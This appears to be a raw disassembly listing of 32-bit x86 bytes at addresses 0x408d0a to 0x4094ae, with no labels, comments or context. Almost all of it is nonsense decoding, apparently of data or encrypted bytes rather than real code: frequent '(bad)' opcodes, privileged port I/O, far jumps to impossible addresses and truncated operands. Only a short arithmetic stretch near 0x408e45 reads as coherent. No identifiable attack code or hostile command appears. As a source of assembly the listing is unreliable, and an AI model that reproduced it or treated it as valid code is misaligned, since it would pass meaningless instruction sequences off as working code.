  408d0a:	sub    eax,0xf1da887e
  408d0f:	add    BYTE PTR [ebx-0x44bff9e0],al
  408d15:	fstp   QWORD PTR [eax+eiz*1]
  408d18:	fdiv   DWORD PTR [edx]
  408d1a:	in     al,0xb0
  408d1c:	xchg   ebp,eax
  408d1d:	cmp    dh,BYTE PTR [esi]
  408d1f:	js     0x408d22
  408d21:	int    0xfc
  408d23:	cld    
  408d24:	aaa    
  408d25:	data16 test al,0x9
  408d28:	inc    edx
  408d29:	sbb    al,0xea
  408d2b:	(bad)  
  408d2c:	in     al,0xd0
  408d2e:	or     al,0x1e
  408d30:	in     eax,dx
  408d31:	clc    
  408d32:	jg     0x408db3
  408d34:	shl    BYTE PTR [edi+0x23],1
  408d37:	jo     0x408d82
  408d39:	jb     0x408d7b
  408d3b:	cmp    al,0x23
  408d3d:	xchg   edx,eax
  408d3e:	dec    esp
  408d3f:	mov    ch,0x4
  408d41:	cmp    al,0x4e
  408d43:	or     bl,BYTE PTR [eax-0x2c250230]
  408d49:	and    DWORD PTR [ecx],edx
  408d4b:	or     edx,DWORD PTR [edi+0x7edec422]
  408d51:	add    al,0x40
  408d53:	lock shr BYTE PTR [esi],0x78
  408d57:	jge    0x408d5a
  408d59:	cmc    
  408d5a:	push   edx
  408d5b:	(bad)  
  408d5d:	fstp   QWORD PTR [ebp+0x2e]
  408d60:	in     eax,0x5a
  408d62:	ret    
  408d63:	mov    dh,0x7b
  408d65:	mov    edi,0x77b89184
  408d6a:	addr16 adc eax,0xc5fcee17
  408d70:	das    
  408d71:	stos   DWORD PTR es:[edi],eax
  408d72:	imul   eax,DWORD PTR [edi],0xeb91b17e
  408d78:	(bad)  
  408d7a:	mov    ss,WORD PTR [eax-0x25]
  408d7d:	shr    BYTE PTR [edi+0x3910fd2c],0xe9
  408d84:	adc    eax,0x301918d2
  408d89:	cmp    al,0x80
  408d8b:	mov    ebp,0x6186c11
  408d90:	sahf   
  408d91:	xchg   esi,eax
  408d92:	in     eax,dx
  408d93:	push   ss
  408d94:	pop    ds
  408d95:	push   cs
  408d96:	inc    DWORD PTR gs:[edx-0x109d3a97]
  408d9d:	jge    0x408de8
  408d9f:	inc    ebp
  408da0:	test   eax,0x140f91d9
  408da5:	cdq    
  408da6:	dec    eax
  408da7:	xchg   edi,eax
  408da8:	inc    ebp
  408da9:	aam    0xdd
  408dab:	mov    WORD PTR [edx],ds
  408dad:	jecxz  0x408dd6
  408daf:	pop    eax
  408db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408db1:	add    ebx,DWORD PTR [edi]
  408db3:	nop
  408db4:	push   ds
  408db5:	(bad)  
  408db7:	mov    ah,0x8
  408db9:	push   es
  408dba:	(bad)  
  408dbb:	cdq    
  408dbc:	lock add BYTE PTR [eax-0x6a],dl
  408dc0:	push   ecx
  408dc1:	cli    
  408dc2:	push   esi
  408dc3:	xor    BYTE PTR [edi+0x870a567],dl
  408dc9:	pusha  
  408dca:	mov    BYTE PTR [ecx-0x565c4fcd],ah
  408dd0:	jnp    0x408e46
  408dd2:	mov    dl,0x40
  408dd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dd5:	lahf   
  408dd6:	adc    DWORD PTR [ecx+0xe5bbc00],esi
  408ddc:	jne    0x408e0f
  408dde:	mov    cl,0x46
  408de0:	dec    eax
  408de1:	pop    esi
  408de2:	jmp    0x4ca2eb5d
  408de7:	test   BYTE PTR [ebx-0x4260e2fa],0x39
  408dee:	ins    BYTE PTR es:[edi],dx
  408def:	fsub   QWORD PTR [ebx-0x248b169b]
  408df5:	pop    eax
  408df6:	jmp    0xd4e1b1f1
  408dfb:	in     al,dx
  408dfc:	push   ecx
  408dfd:	shl    DWORD PTR [edx+0x5e],0x82
  408e01:	dec    ecx
  408e02:	mov    edi,0xa8facd20
  408e07:	repz xor esi,ecx
  408e0a:	stc    
  408e0b:	xchg   ecx,eax
  408e0c:	inc    edx
  408e0d:	cmp    edx,DWORD PTR [edi+0x926d0b6]
  408e13:	fidiv  DWORD PTR [esi+0x4b]
  408e16:	pop    esp
  408e17:	xlat   BYTE PTR ds:[ebx]
  408e18:	lods   eax,DWORD PTR ds:[esi]
  408e19:	xchg   ecx,eax
  408e1a:	mov    ah,0x4c
  408e1c:	test   eax,0xd8355057
  408e21:	mov    DWORD PTR [ecx],edx
  408e23:	stc    
  408e24:	add    ch,BYTE PTR [ebx+0x44]
  408e27:	jp     0x408ddf
  408e29:	sub    DWORD PTR [ebp-0x5683fa35],ebx
  408e2f:	(bad)  
  408e30:	xchg   ebx,eax
  408e31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e32:	ret    
  408e33:	sub    DWORD PTR es:[edi],eax
  408e36:	retf   
  408e37:	mov    dl,0xe
  408e39:	iret   
  408e3a:	nop
  408e3b:	(bad)  
  408e3c:	out    dx,eax
  408e3d:	call   0x102f2c1c
  408e42:	lods   al,BYTE PTR ds:[esi]
  408e43:	rol    BYTE PTR [edx],1
  408e45:	mov    DWORD PTR [ebp+0x14],eax
  408e48:	mov    eax,DWORD PTR [esi]
  408e4a:	xor    DWORD PTR [ebp+0x14],edi
  408e4d:	shr    edx,0x2
  408e50:	mov    edx,DWORD PTR [esi+0x4]
  408e53:	xor    edx,edx
  408e55:	shl    eax,0x1e
  408e58:	or     edx,DWORD PTR [ebp+0x14]
  408e5b:	mov    DWORD PTR [ebp-0x28],edx
  408e5e:	mov    eax,DWORD PTR [ebp-0x24]
  408e61:	mov    eax,DWORD PTR [ebp-0x24]
  408e64:	jmp    0x409242
  408e69:	and    al,BYTE PTR [ebp-0x6d]
  408e6c:	pop    ss
  408e6d:	jb     0x408e35
  408e6f:	and    ah,BYTE PTR ds:0x7e10ec41
  408e75:	push   edi
  408e76:	addr16 test eax,0x18513abc
  408e7c:	sbb    BYTE PTR [esi-0x36e7e7ee],bl
  408e82:	and    cl,BYTE PTR [edx-0x1f]
  408e85:	jno    0x408e71
  408e87:	xlat   BYTE PTR ds:[ebx]
  408e88:	sub    eax,0x24c487a
  408e8d:	and    al,0x64
  408e8f:	jp     0x408e73
  408e91:	xchg   edx,eax
  408e92:	adc    dh,BYTE PTR [ecx-0x57d766fc]
  408e98:	and    DWORD PTR [ecx],esp
  408e9a:	push   edx
  408e9b:	jne    0x408e5a
  408e9d:	push   esp
  408e9e:	fwait
  408e9f:	xor    BYTE PTR [esi-0x4],bl
  408ea2:	mov    ecx,0xc92ef663
  408ea7:	icebp  
  408ea8:	idiv   DWORD PTR [ecx+0x73c15d89]
  408eae:	pop    esi
  408eaf:	pop    edi
  408eb0:	or     al,0x90
  408eb2:	cli    
  408eb3:	mov    DWORD PTR [esi+0x77],ebx
  408eb6:	xor    al,BYTE PTR [edi+0x62]
  408eb9:	test   al,0xbb
  408ebb:	rcl    ebp,cl
  408ebd:	pop    esp
  408ebe:	into   
  408ebf:	aam    0x9b
  408ec1:	jg     0x408efb
  408ec3:	xchg   edi,eax
  408ec4:	ins    BYTE PTR es:[edi],dx
  408ec5:	out    dx,eax
  408ec6:	or     al,0x5a
  408ec8:	adc    edi,DWORD PTR [edx+0x23]
  408ecb:	add    DWORD PTR [edx+0x37],eax
  408ece:	call   0x96e1305c
  408ed3:	cmp    DWORD PTR [edi+0x2734bcb1],ecx
  408ed9:	pop    esi
  408eda:	xchg   edi,eax
  408edb:	xor    bl,al
  408edd:	aad    0xb0
  408edf:	mov    BYTE PTR [ebp+0x2c],ah
  408ee2:	call   0x2dfa7d72
  408ee7:	dec    ebp
  408ee8:	pusha  
  408ee9:	js     0x408e75
  408eeb:	ss jne 0x408eff
  408eee:	push   ss
  408eef:	push   eax
  408ef0:	mov    eax,0x64b125
  408ef5:	sbb    ecx,DWORD PTR [esi-0x5d3a35c4]
  408efb:	les    edx,FWORD PTR [ecx+0x8]
  408efe:	test   eax,0xcbbd9214
  408f03:	sar    esi,1
  408f05:	jae    0x408f6f
  408f07:	push   esi
  408f08:	jecxz  0x408ed5
  408f0a:	mov    eax,0xf48e35a2
  408f0f:	xchg   ebx,eax
  408f10:	(bad)  
  408f12:	clc    
  408f13:	sbb    eax,0x226ed2b6
  408f18:	outs   dx,DWORD PTR ds:[esi]
  408f19:	in     al,dx
  408f1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f1b:	ja     0x408ee7
  408f1d:	adc    al,0x46
  408f1f:	je     0x408f7b
  408f21:	cmp    eax,0xb7ac4607
  408f26:	sbb    al,0x82
  408f28:	mov    al,ds:0x9029c3aa
  408f2d:	pop    ds
  408f2e:	fiadd  WORD PTR [ebp+0x53571444]
  408f34:	imul   eax,DWORD PTR ds:[eax-0x2d756756],0x50f3eb92
  408f3f:	fnstsw WORD PTR [ecx-0x20c143a1]
  408f45:	xchg   esp,eax
  408f46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f47:	ret    
  408f48:	fstp   st(6)
  408f4a:	and    DWORD PTR [eax],esp
  408f4c:	or     eax,0x58ae5373
  408f51:	pop    edi
  408f52:	test   dl,ch
  408f54:	jbe    0x408f00
  408f56:	jle    0x408fb9
  408f58:	int    0x14
  408f5a:	aam    0x42
  408f5c:	std    
  408f5d:	nop
  408f5e:	cwde   
  408f5f:	xchg   DWORD PTR [edx-0x62],eax
  408f62:	xor    ebx,DWORD PTR ds:0x5a29314
  408f68:	sub    eax,0xd60d2d9
  408f6d:	fild   QWORD PTR [edx-0x48]
  408f70:	xor    edx,esp
  408f72:	rcr    DWORD PTR [edx],0x3e
  408f75:	jns    0x408fab
  408f77:	push   ds
  408f78:	jae    0x408f22
  408f7a:	inc    esp
  408f7b:	fcmovnu st,st(2)
  408f7d:	jbe    0x408f9a
  408f7f:	adc    edi,DWORD PTR ds:0xf6aa82ee
  408f85:	pop    esi
  408f86:	test   DWORD PTR [esi],ecx
  408f88:	dec    ebx
  408f89:	(bad)  
  408f8a:	ret    0x411e
  408f8d:	push   ds
  408f8e:	clc    
  408f8f:	retf   0x53ac
  408f92:	pop    esp
  408f93:	pop    eax
  408f94:	lahf   
  408f95:	(bad)  
  408f96:	ret    0x778d
  408f99:	cmc    
  408f9a:	add    BYTE PTR [edx],dh
  408f9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f9d:	sub    al,0x8b
  408f9f:	je     0x408f2b
  408fa1:	into   
  408fa2:	out    0x6a,eax
  408fa4:	stos   BYTE PTR es:[edi],al
  408fa5:	mov    eax,0xe98f80c2
  408faa:	adc    dl,bh
  408fac:	data16 aaa 
  408fae:	mov    eax,ds:0x85871eb2
  408fb3:	(bad)  [ebx]
  408fb5:	dec    ebx
  408fb6:	jmp    0xec49:0xe1526f1f
  408fbd:	sbb    DWORD PTR [edx+0x34],eax
  408fc0:	(bad)  
  408fc2:	test   DWORD PTR [esp+ebx*4],edx
  408fc5:	cmp    esp,edx
  408fc7:	cmc    
  408fc8:	sub    DWORD PTR [ebp+0x65],0x19
  408fcc:	jge    0x40902b
  408fce:	sub    bl,BYTE PTR [esi-0x40]
  408fd1:	adc    dh,bl
  408fd3:	mov    edi,0x3d0bab2e
  408fd8:	mov    bh,0x2e
  408fda:	xchg   BYTE PTR fs:[edi-0x5c7d019e],dl
  408fe1:	fwait
  408fe2:	popf   
  408fe3:	sbb    al,0x62
  408fe5:	lea    edx,[ecx]
  408fe7:	mov    dh,0x45
  408fe9:	pop    esi
  408fea:	xchg   edx,eax
  408feb:	popa   
  408fec:	dec    ebx
  408fed:	in     al,0x20
  408fef:	pushf  
  408ff0:	data16 jb 0x408f8b
  408ff3:	cmp    al,0xe1
  408ff5:	jnp    0x408f81
  408ff7:	or     edx,DWORD PTR [edx+0x75]
  408ffa:	inc    edx
  408ffb:	ins    BYTE PTR es:[edi],dx
  408ffc:	in     al,dx
  408ffd:	scas   al,BYTE PTR es:[edi]
  408ffe:	stos   DWORD PTR es:[edi],eax
  408fff:	adc    esi,edi
  409001:	jp     0x40905d
  409003:	nop
  409004:	pushf  
  409005:	cs ins BYTE PTR es:[edi],dx
  409007:	push   ebp
  409008:	shl    DWORD PTR [esi],1
  40900a:	(bad)  
  40900b:	mov    bh,ch
  40900d:	pusha  
  40900e:	scas   al,BYTE PTR es:[edi]
  40900f:	imul   BYTE PTR [ecx-0x49677aee]
  409015:	nop
  409016:	in     eax,dx
  409017:	(bad)  
  409018:	shl    BYTE PTR [ebp+0x28],cl
  40901b:	fwait
  40901c:	sbb    DWORD PTR [eax],edx
  40901e:	and    dh,bl
  409020:	push   edx
  409021:	mov    eax,ds:0xadcb4d10
  409026:	push   ebx
  409027:	push   ss
  409028:	int3   
  409029:	sub    al,0xc0
  40902b:	sbb    al,0x26
  40902d:	push   esp
  40902e:	cmp    ebx,DWORD PTR [ebx+0x4b]
  409031:	das    
  409032:	add    BYTE PTR [ebp+0x273d0197],ch
  409038:	stos   DWORD PTR es:[edi],eax
  409039:	shl    DWORD PTR [ebx],cl
  40903b:	sub    dl,bl
  40903d:	add    DWORD PTR [esi],eax
  40903f:	jae    0x408fc1
  409041:	dec    esi
  409042:	xor    DWORD PTR [edi-0x2e],0x5a3d55aa
  409049:	inc    eax
  40904a:	dec    eax
  40904b:	jo     0x4090a4
  40904d:	inc    ebx
  40904e:	inc    ebx
  40904f:	mov    es:0xff6b6fab,eax
  409055:	mov    ds:0x694b6c2a,al
  40905a:	repnz xor al,0xde
  40905d:	test   al,0x2e
  40905f:	xor    BYTE PTR [ecx-0x51],dh
  409062:	xabort 0x4c
  409065:	xchg   ecx,eax
  409066:	call   FWORD PTR [ecx+0x75]
  409069:	xchg   edi,eax
  40906a:	pop    edi
  40906b:	stos   DWORD PTR es:[edi],eax
  40906c:	int    0xfb
  40906e:	sbb    al,0xd9
  409070:	push   ss
  409071:	add    ebx,ecx
  409073:	cmc    
  409074:	inc    ebx
  409075:	jp     0x4090ba
  409077:	adc    edx,DWORD PTR [ebx-0x3eb7de0e]
  40907d:	jae    0x4090fb
  40907f:	mov    ds:0xf8e99e0c,eax
  409084:	mov    al,ds:0xb3bddb30
  409089:	es stos BYTE PTR es:[edi],al
  40908b:	mov    ecx,0x8be4a38
  409090:	icebp  
  409091:	jns    0x4090fb
  409093:	and    edx,edx
  409095:	ins    DWORD PTR es:[edi],dx
  409096:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409097:	xlat   BYTE PTR ds:[ebx]
  409098:	ins    DWORD PTR es:[edi],dx
  409099:	enter  0x9c0b,0xc1
  40909d:	inc    esp
  40909e:	test   eax,0x4a5c41eb
  4090a3:	sub    eax,DWORD PTR [eax+0x48659924]
  4090a9:	lea    edi,[ecx+0x5c]
  4090ac:	sub    eax,0xd2c589fd
  4090b1:	mov    WORD PTR [ecx-0x5a],?
  4090b4:	stos   BYTE PTR es:[edi],al
  4090b5:	js     0x409132
  4090b7:	add    esi,edx
  4090b9:	adc    bl,BYTE PTR [eax-0x20]
  4090bc:	fldenv [esi+0x9]
  4090bf:	call   0x7aa3:0x2fd41a34
  4090c6:	je     0x409086
  4090c8:	scas   al,BYTE PTR es:[edi]
  4090c9:	mov    dh,0xef
  4090cb:	dec    eax
  4090cc:	or     BYTE PTR [ebp-0x45f29947],dh
  4090d2:	scas   al,BYTE PTR es:[edi]
  4090d3:	mov    edi,0xdb0d8adb
  4090d8:	mov    ebp,0xc5876059
  4090dd:	popa   
  4090de:	mov    ebx,0x4745c964
  4090e3:	sbb    BYTE PTR [edi-0x5e5d62d6],0x1b
  4090ea:	jge    0x40910a
  4090ec:	mov    al,0x74
  4090ee:	jecxz  0x4090dc
  4090f0:	add    BYTE PTR [ecx],bl
  4090f2:	scas   eax,DWORD PTR es:[edi]
  4090f3:	jo     0x40909c
  4090f5:	push   DWORD PTR [eax-0x1da83065]
  4090fb:	sub    edx,DWORD PTR [edi-0x1e]
  4090fe:	add    DWORD PTR [edx+0x51fde6ff],esp
  409104:	mov    al,BYTE PTR [edi+0x39]
  409107:	lahf   
  409108:	and    dh,BYTE PTR [edi-0x6cc4f65]
  40910e:	repnz mov al,ds:0x2bd31b2f
  409114:	les    edx,FWORD PTR [eax]
  409116:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409117:	sbb    ebx,DWORD PTR [esi+edx*2+0x7fd76e88]
  40911e:	clc    
  40911f:	push   ss
  409120:	push   ebx
  409121:	add    eax,0xf78638e3
  409126:	fmul   QWORD PTR [ebx+0x75]
  409129:	rcr    DWORD PTR [ebx],0x4c
  40912c:	push   esp
  40912d:	in     al,dx
  40912e:	or     eax,0x9e738576
  409133:	push   cs
  409134:	mov    edx,0xd75909f8
  409139:	lea    ebp,[ebx]
  40913b:	mov    ds:0x39cf5d21,eax
  409140:	imul   esi,ecx,0x3b1cb502
  409146:	push   edi
  409147:	sahf   
  409148:	inc    eax
  409149:	fisubr DWORD PTR [edi]
  40914c:	and    ecx,DWORD PTR [ecx-0x4e]
  40914f:	loop   0x409173
  409151:	pop    esi
  409152:	lods   al,BYTE PTR ds:[esi]
  409153:	arpl   WORD PTR [edi],cx
  409155:	ss mov dl,0x3f
  409158:	mov    al,0x20
  40915a:	pop    ebp
  40915b:	dec    ebx
  40915c:	pop    ecx
  40915d:	sar    BYTE PTR [edi+esi*8-0x5a],cl
  409161:	out    0xef,eax
  409163:	aaa    
  409164:	call   0xb673fc5d
  409169:	and    eax,0x9c73cc3b
  40916e:	int    0x8f
  409170:	xor    bl,BYTE PTR [ebx+0x5b]
  409173:	bswap  esp
  409175:	jecxz  0x40916a
  409177:	jns    0x409132
  409179:	fmul   DWORD PTR [edx+edx*4+0x6d]
  40917d:	mov    ebp,0x4f557929
  409182:	xchg   DWORD PTR [edx-0x65c92bd8],edi
  409188:	fsubr  QWORD PTR [edi+0x448c8e63]
  40918e:	jmp    0x42219cde
  409193:	xchg   bh,bh
  409195:	sbb    edx,edi
  409197:	jno    0x40919f
  409199:	pop    es
  40919a:	ins    BYTE PTR es:[edi],dx
  40919b:	into   
  40919c:	inc    ebx
  40919d:	mov    al,0x9f
  40919f:	mov    dh,0xff
  4091a1:	outs   dx,DWORD PTR ds:[esi]
  4091a2:	aad    0x7
  4091a4:	jg     0x409184
  4091a6:	and    eax,DWORD PTR [edi+0x451be45d]
  4091ac:	out    0xd3,eax
  4091ae:	xor    DWORD PTR [esi],ebx
  4091b0:	cdq    
  4091b1:	das    
  4091b2:	pop    es
  4091b3:	mov    ebx,edx
  4091b5:	lea    esi,[ebx+ebx*1+0x257859d2]
  4091bc:	(bad)  
  4091bd:	mov    eax,0xda1682b9
  4091c2:	cwde   
  4091c3:	pop    eax
  4091c4:	jns    0x40919d
  4091c6:	aaa    
  4091c7:	and    esi,eax
  4091c9:	pop    esi
  4091ca:	(bad)  
  4091cb:	pop    esi
  4091cc:	inc    ebx
  4091cd:	addr16 jno 0x4091c5
  4091d0:	mov    es,WORD PTR [ecx]
  4091d2:	mov    al,ds:0x5ff6d751
  4091d7:	push   ss
  4091d8:	(bad)  
  4091da:	(bad)  
  4091db:	mov    ds:0x40fe9629,eax
  4091e0:	js     0x40923d
  4091e2:	sbb    esi,DWORD PTR [esp+ebp*1]
  4091e5:	sub    edx,DWORD PTR [eax+edx*1]
  4091e8:	lea    ecx,ds:0xcf973e04
  4091ee:	jbe    0x4091ea
  4091f0:	mov    ch,BYTE PTR [eax-0x49dc0ce2]
  4091f6:	std    
  4091f7:	dec    ecx
  4091f8:	or     ch,BYTE PTR [esi]
  4091fa:	cwde   
  4091fb:	js     0x409276
  4091fd:	inc    ebx
  4091fe:	xor    BYTE PTR [edx+0x3551210c],dl
  409204:	add    edx,esp
  409206:	inc    ebp
  409207:	inc    ebp
  409208:	scas   eax,DWORD PTR es:[edi]
  409209:	fisttp QWORD PTR [eax]
  40920b:	scas   al,BYTE PTR es:[edi]
  40920c:	dec    esi
  40920d:	out    0x6c,eax
  40920f:	sahf   
  409210:	lods   eax,DWORD PTR ds:[esi]
  409211:	add    eax,eax
  409213:	xchg   ebx,eax
  409214:	scas   eax,DWORD PTR es:[edi]
  409215:	add    BYTE PTR [eax-0x49755b34],dh
  40921b:	xchg   esp,eax
  40921c:	jns    0x409252
  40921e:	mov    BYTE PTR [esi-0x47c4a24e],ch
  409224:	daa    
  409225:	cmp    ebp,edx
  409227:	mov    ds:0x5907694,al
  40922c:	cmp    al,0x13
  40922e:	push   0xaec53d00
  409233:	jns    0x4091ed
  409235:	push   0x2a362ce5
  40923a:	and    edi,DWORD PTR [edx]
  40923c:	mov    cl,0x57
  40923e:	pop    edi
  40923f:	pop    ebx
  409240:	adc    dh,BYTE PTR gs:[ebx]
  409243:	ror    BYTE PTR [edi],cl
  409245:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409246:	ret    0x3302
  409249:	ror    DWORD PTR [ecx-0x2616f3ab],1
  40924f:	add    eax,DWORD PTR [eax]
  409251:	add    dl,ah
  409253:	and    eax,0xea26ea26
  409258:	sbb    bl,BYTE PTR ds:0x70a1617f
  40925e:	outs   dx,DWORD PTR ds:[esi]
  40925f:	push   cs
  409260:	mov    eax,ds:0x1849c070
  409265:	sbb    BYTE PTR [esi+0x26181812],bl
  40926b:	add    ebp,DWORD PTR [eax+esi*1]
  40926e:	mov    WORD PTR [edx],gs
  409270:	push   ebx
  409271:	cmp    al,0x0
  409273:	jg     0x40928b
  409275:	cli    
  409276:	or     dh,BYTE PTR [ecx]
  409278:	adc    al,0x94
  40927a:	pushf  
  40927b:	cli    
  40927c:	jmp    0x5f3c3bb6
  409281:	call   0xf4d:0xddc555f0
  409288:	lds    ecx,FWORD PTR [ebp+0x16]
  40928b:	outs   dx,DWORD PTR ds:[esi]
  40928c:	jmp    0xc94e98ed
  409291:	xchg   ebx,esp
  409293:	ret    0x39ff
  409296:	out    dx,al
  409297:	mov    bh,0x44
  409299:	pop    ecx
  40929a:	jnp    0x4092cd
  40929c:	outs   dx,BYTE PTR ds:[esi]
  40929d:	out    dx,al
  40929e:	mov    WORD PTR [edx+0x7b],?
  4092a1:	lock mov dh,0x6d
  4092a4:	inc    esi
  4092a5:	mov    BYTE PTR ds:0x97009155,bh
  4092ab:	addr16 push cs
  4092ad:	fst    QWORD PTR [ebx-0x24]
  4092b0:	das    
  4092b1:	sub    DWORD PTR [edx+0x25],ebp
  4092b4:	add    eax,0xeb0d752b
  4092b9:	xor    esi,DWORD PTR [ecx+0x8]
  4092bc:	fdivr  QWORD PTR [edx]
  4092be:	xchg   ebx,eax
  4092bf:	jmp    0x59189e17
  4092c4:	stc    
  4092c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092c6:	ficomp DWORD PTR [edi-0x1583a525]
  4092cc:	adc    eax,0xba93a4b6
  4092d1:	cmovno edx,DWORD PTR [esi-0x47]
  4092d5:	test   BYTE PTR [edx-0x3d87284b],bh
  4092db:	xchg   edx,eax
  4092dc:	sar    DWORD PTR [esi+0x7db4760a],cl
  4092e2:	fstp   DWORD PTR [eax]
  4092e4:	sbb    al,0x18
  4092e6:	cwde   
  4092e7:	mov    cl,0xb1
  4092e9:	mov    ah,0x19
  4092eb:	popa   
  4092ec:	iret   
  4092ed:	cli    
  4092ee:	cli    
  4092ef:	adc    bl,ch
  4092f1:	xlat   BYTE PTR ds:[ebx]
  4092f2:	pop    es
  4092f3:	outs   dx,BYTE PTR ds:[esi]
  4092f4:	push   esi
  4092f5:	imul   edi,DWORD PTR [edx],0xdf1d02a1
  4092fb:	push   esp
  4092fc:	xchg   edx,eax
  4092fd:	jae    0x409347
  4092ff:	push   esi
  409300:	jo     0x40930f
  409302:	arpl   WORD PTR ds:0x83e56b2e,sp
  409308:	mul    DWORD PTR [edx]
  40930a:	idiv   BYTE PTR [edx+0x69d9fbbe]
  409310:	daa    
  409311:	inc    ecx
  409312:	outs   dx,DWORD PTR ds:[esi]
  409313:	push   cs
  409314:	mov    ds:0x192669ce,eax
  409319:	xchg   esi,eax
  40931a:	mov    BYTE PTR [esi+edi*8],cl
  40931d:	xor    edi,edx
  40931f:	test   BYTE PTR [ebp-0x78],bl
  409322:	cmp    esp,ebp
  409324:	push   esi
  409325:	jmp    0xa9c1:0x9107e2cb
  40932c:	lea    ebp,[esi+0x78016dbe]
  409332:	mov    dh,0xa3
  409334:	in     al,0x81
  409336:	cmp    bh,ch
  409338:	imul   esp,DWORD PTR [edi+0x45],0x8058898
  40933f:	cdq    
  409340:	push   eax
  409341:	ror    BYTE PTR [edi+ebx*2],cl
  409344:	popf   
  409345:	push   ebp
  409346:	push   0x3a6e53d6
  40934b:	dec    ebp
  40934c:	mov    eax,0xa1cab981
  409351:	stc    
  409352:	cs push ebp
  409354:	out    0xf6,al
  409356:	into   
  409357:	add    ebx,DWORD PTR [ebx+0x38327916]
  40935d:	mov    eax,ds:0x217397aa
  409362:	lods   al,BYTE PTR ds:[esi]
  409363:	hlt    
  409364:	jecxz  0x4093de
  409366:	dec    edi
  409367:	pushf  
  409368:	jg     0x409342
  40936a:	mov    ah,0xe3
  40936c:	add    esi,DWORD PTR [ecx]
  40936e:	push   DWORD PTR [esi-0x42]
  409371:	mov    ecx,0xa03c7d8e
  409376:	dec    ebx
  409377:	into   
  409378:	push   ss
  409379:	or     edx,eax
  40937b:	sbb    eax,0x705d202
  409380:	and    edx,edx
  409382:	jae    0x409336
  409384:	pop    es
  409385:	push   esp
  409386:	(bad)  
  409388:	adc    al,0x45
  40938a:	push   0x61
  40938c:	stos   BYTE PTR es:[edi],al
  40938d:	jmp    0xb7ef:0x8ea5e6a2
  409394:	lock fcomp DWORD PTR [edi-0x1e2103c]
  40939b:	or     BYTE PTR [esi-0x512dec9c],ch
  4093a1:	dec    ebp
  4093a2:	mov    ss,edx
  4093a4:	jge    0x409374
  4093a6:	jns    0x40940d
  4093a8:	shr    DWORD PTR [ecx-0x2991221c],cl
  4093ae:	(bad)
  4093b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093b2:	sub    eax,0x9d4dc6f2
  4093b7:	cmc    
  4093b8:	xor    al,0x7e
  4093ba:	xchg   ebx,eax
  4093bb:	jmp    0x409395
  4093bd:	imul   eax,DWORD PTR ds:0x84c54cef,0xf64176c5
  4093c7:	pop    edi
  4093c8:	cmp    dh,ch
  4093ca:	aad    0xff
  4093cc:	ficom  DWORD PTR [edi+0x17f9b321]
  4093d2:	fdivr  DWORD PTR [edx]
  4093d4:	out    0xee,eax
  4093d6:	(bad)  
  4093d7:	out    0xf8,eax
  4093d9:	out    0x2,eax
  4093db:	test   eax,0x7bcde11d
  4093e0:	adc    bh,dh
  4093e2:	sbb    BYTE PTR [esi+0x21],dh
  4093e5:	shl    edx,1
  4093e7:	retf   
  4093e8:	lock test BYTE PTR [edi+0x31],ch
  4093ec:	mov    bh,0xbc
  4093ee:	in     al,dx
  4093ef:	jl     0x4093d2
  4093f1:	popf   
  4093f2:	mov    ds,WORD PTR [ecx]
  4093f4:	cs ds jge 0x409428
  4093f8:	bswap  ecx
  4093fa:	adc    eax,DWORD PTR [ebp-0x47]
  4093fd:	dec    ebx
  4093fe:	iret   
  4093ff:	repz je 0x4093bd
  409402:	mov    al,0x8d
  409404:	xchg   ebp,eax
  409405:	inc    ecx
  409406:	or     DWORD PTR [ebp+eax*2+0x7d],ebp
  40940a:	icebp  
  40940b:	mov    al,ds:0xebf4287e
  409410:	(bad)  
  409411:	jnp    0x40945c
  409413:	xchg   ebp,eax
  409414:	and    ch,BYTE PTR [esi]
  409416:	ins    BYTE PTR es:[edi],dx
  409417:	out    0xf7,eax
  409419:	jne    0x4093cb
  40941b:	or     bh,bl
  40941d:	les    eax,FWORD PTR gs:[edx]
  409420:	inc    edi
  409421:	and    eax,0x4cb8a467
  409426:	arpl   WORD PTR [ecx-0x4c86e107],cx
  40942c:	cmovg  esp,DWORD PTR ds:0x116f1a2a
  409433:	sub    dh,0x6e
  409436:	sbb    dl,al
  409438:	dec    esi
  409439:	dec    edi
  40943a:	mov    ebp,0x9b1d7ab8
  40943f:	(bad)  
  409440:	(bad)  
  409441:	scas   al,BYTE PTR es:[edi]
  409442:	xchg   ecx,eax
  409443:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409444:	and    BYTE PTR [ebx+edi*2],ah
  409447:	push   ebp
  409448:	fnstsw WORD PTR [edx-0x2a]
  40944b:	lock or ebp,DWORD PTR [ebx+0x7e]
  40944f:	push   ss
  409450:	adc    al,0xa1
  409452:	push   edi
  409453:	or     ebx,esi
  409455:	add    edi,DWORD PTR [edi-0x66]
  409458:	pop    edx
  409459:	je     0x4094d8
  40945b:	or     DWORD PTR [eax+0x11],ebx
  40945e:	pusha  
  40945f:	and    esi,DWORD PTR [ebx-0x1c61200e]
  409465:	imul   ecx,DWORD PTR [edi],0x6ed74124
  40946b:	fld    DWORD PTR [edx+0x19]
  40946e:	lahf   
  40946f:	xor    eax,0x8c08c398
  409474:	bound  di,DWORD PTR [ebx+0x18fd4d1c]
  40947b:	pop    ds
  40947c:	add    dh,BYTE PTR [edi-0x8]
  40947f:	mov    ebx,0x82de5586
  409484:	dec    edi
  409485:	dec    ebp
  409486:	add    edi,DWORD PTR [ebp-0x7d62ddd9]
  40948c:	repz gs arpl bp,cx
  409490:	outs   dx,BYTE PTR ds:[esi]
  409491:	jbe    0x4094f1
  409493:	enter  0xca37,0xfd
  409497:	int    0xb1
  409499:	pop    edx
  40949a:	xchg   ebx,eax
  40949b:	cmp    al,BYTE PTR [esi]
  40949d:	adc    BYTE PTR [ecx+0x1a],bl
  4094a0:	jae    0x409473
  4094a2:	sti    
  4094a3:	jmp    0x409449
  4094a5:	push   0x7a1829c9
  4094aa:	addr16 mov cl,0xfa
  4094ad:	dec    eax
  4094ae:	and    DWORD PTR [esi+0x10],eax
